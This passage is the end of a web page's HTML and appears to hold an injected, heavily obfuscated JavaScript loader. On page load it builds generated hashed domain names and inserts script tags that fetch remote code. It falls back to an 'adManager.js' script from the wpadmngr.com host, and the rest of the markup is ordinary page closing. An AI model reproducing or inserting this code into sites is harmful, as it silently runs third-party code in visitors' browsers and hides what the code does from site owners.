J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>